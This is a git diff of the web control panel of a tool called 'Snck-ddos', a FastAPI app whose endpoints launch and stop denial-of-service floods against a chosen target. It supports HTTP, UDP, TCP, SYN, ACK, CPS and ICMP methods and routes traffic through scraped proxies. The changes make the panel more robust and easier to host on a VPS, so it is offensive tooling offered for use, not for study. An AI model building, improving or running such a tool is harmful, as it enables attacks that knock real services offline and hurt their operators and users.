@@ -3,28 +3,53 @@
 
 from __future__ import annotations
 
-import asyncio
+import traceback
 from pathlib import Path
-from typing import Optional
 
 from fastapi import FastAPI, Request, BackgroundTasks
-from fastapi.responses import HTMLResponse, JSONResponse
-from fastapi.staticfiles import StaticFiles
-from fastapi.templating import Jinja2Templates
+from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse
 from pydantic import BaseModel, Field
-
-from core.engine import engine, AttackConfig
-from core.proxy import scrape_proxies, check_batch, load_proxies, save_proxies
 
 ROOT = Path(__file__).resolve().parent.parent
 STATIC = ROOT / "static"
-TEMPLATES = Jinja2Templates(directory=str(ROOT / "web" / "templates"))
+TEMPLATE_DIR = ROOT / "web" / "templates"
+TEMPLATE_FILE = TEMPLATE_DIR / "index.html"
 
 app = FastAPI(title="Snck-ddos", docs_url=None, redoc_url=None)
-app.mount("/static", StaticFiles(directory=str(STATIC)), name="static")
+
+# static is optional — never crash startup if folder missing
+try:
+    STATIC.mkdir(parents=True, exist_ok=True)
+    from fastapi.staticfiles import StaticFiles
+    app.mount("/static", StaticFiles(directory=str(STATIC)), name="static")
+except Exception as e:
+    print("[warn] static mount skipped:", e)
+
+# engine import — soft-fail so / still answers
+_engine_err = None
+try:
+    from core.engine import engine, AttackConfig
+    from core.proxy import scrape_proxies, check_batch, load_proxies, save_proxies
+except Exception as e:
+    engine = None  # type: ignore
+    AttackConfig = None  # type: ignore
+    _engine_err = f"{type(e).__name__}: {e}"
+    print("[error] core import failed:", _engine_err)
+    traceback.print_exc()
 
 PROXY_FILE = ROOT / "proxies.txt"
 LIVE_PROXY_FILE = ROOT / "live_proxies.txt"
+
+FALLBACK_HTML = """<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Snck-ddos</title>
+<style>body{font-family:monospace;background:#0a0a0c;color:#e4e4e7;padding:2rem}
+a{color:#e11d48}</style></head>
+<body>
+<h1>SNCK-ddos</h1>
+<p>Panel template missing or failed to load.</p>
+<p>API health: <a href="/health">/health</a> · stats: <a href="/api/stats">/api/stats</a></p>
+<p>Fix: ensure web/templates/index.html exists, then restart.</p>
+</body></html>"""
 
 
 class StartBody(BaseModel):
@@ -36,16 +61,36 @@ class StartBody(BaseModel):
     use_proxies: bool = True
 
 
+@app.get("/health")
+async def health():
+    return {
+        "ok": True,
+        "engine": _engine_err is None,
+        "engine_error": _engine_err,
+        "template": TEMPLATE_FILE.is_file(),
+        "root": str(ROOT),
+    }
+
+
 @app.get("/", response_class=HTMLResponse)
 async def index(request: Request):
-    return TEMPLATES.TemplateResponse(
-        "index.html",
-        {"request": request},
-    )
+    if TEMPLATE_FILE.is_file():
+        try:
+            from fastapi.templating import Jinja2Templates
+            templates = Jinja2Templates(directory=str(TEMPLATE_DIR))
+            return templates.TemplateResponse("index.html", {"request": request})
+        except Exception as e:
+            return HTMLResponse(
+                FALLBACK_HTML + f"<!-- template error: {e} -->",
+                status_code=200,
+            )
+    return HTMLResponse(FALLBACK_HTML, status_code=200)
 
 
 @app.get("/api/stats")
 async def stats():
+    if engine is None:
+        return {"running": False, "error": _engine_err or "engine missing", "requests": 0, "rps": 0, "mbps": 0, "errors": 0, "active_workers": 0, "uptime": 0}
     s = engine.stats
     return {
         "running": s.running,
@@ -64,17 +109,22 @@ async def stats():
 
 @app.post("/api/start")
 async def start_attack(body: StartBody, bg: BackgroundTasks):
+    if engine is None or AttackConfig is None:
+        return JSONResponse({"ok": False, "error": _engine_err or "engine not loaded"}, status_code=500)
     if engine.stats.running:
         return JSONResponse({"ok": False, "error": "attack already running"}, status_code=400)
 
     proxies: list[str] = []
     if body.use_proxies:
-        proxies = load_proxies(LIVE_PROXY_FILE)
-        if not proxies:
-            proxies = load_proxies(PROXY_FILE)
+        try:
+            proxies = load_proxies(LIVE_PROXY_FILE)
+            if not proxies:
+                proxies = load_proxies(PROXY_FILE)
+        except Exception:
+            proxies = []
 
     target = body.target.strip()
-    if not target.startswith(("http://", "https://")) and body.method.upper() not in ("UDP", "TCP", "SYN"):
+    if not target.startswith(("http://", "https://")) and body.method.upper() not in ("UDP", "TCP", "SYN", "ACK", "CPS", "ICMP"):
         target = "http://" + target
 
     cfg = AttackConfig(
@@ -95,12 +145,17 @@ async def start_attack(body: StartBody, bg: BackgroundTasks):
 
 @app.post("/api/stop")
 async def stop_attack():
+    if engine is None:
+        return {"ok": False, "error": "engine not loaded"}
     await engine.stop()
     return {"ok": True}
 
 
 @app.post("/api/scrape")
 async def api_scrape(bg: BackgroundTasks):
+    if engine is None:
+        return JSONResponse({"ok": False, "error": "proxy module not loaded"}, status_code=500)
+
     async def _job():
         raw = await scrape_proxies()
         save_proxies(raw, PROXY_FILE)
@@ -113,20 +168,27 @@ async def api_scrape(bg: BackgroundTasks):
 
 @app.get("/api/proxies")
 async def api_proxies():
-    raw = load_proxies(PROXY_FILE)
-    live = load_proxies(LIVE_PROXY_FILE)
-    return {"raw": len(raw), "live": len(live)}
+    try:
+        raw = load_proxies(PROXY_FILE)
+        live = load_proxies(LIVE_PROXY_FILE)
+        return {"raw": len(raw), "live": len(live)}
+    except Exception:
+        return {"raw": 0, "live": 0}
 
 
 def run(host: str = "0.0.0.0", port: int = 6666) -> None:
     import uvicorn
+    print(f"[*] binding http://{host}:{port}")
+    print(f"[*] open http://YOUR_VPS_IP:{port}  (not about:blank)")
+    print(f"[*] health check: http://YOUR_VPS_IP:{port}/health")
+    print(f"[*] if phone shows blank: open firewall port {port}/tcp")
+    # pass app object directly — avoids import-string path issues on some VPS layouts
     uvicorn.run(
-        "web.app:app",
+        app,
         host=host,
         port=port,
         log_level="info",
         workers=1,
-        loop="uvloop" if __import__("sys").platform != "win32" else "asyncio",
     )
 
 
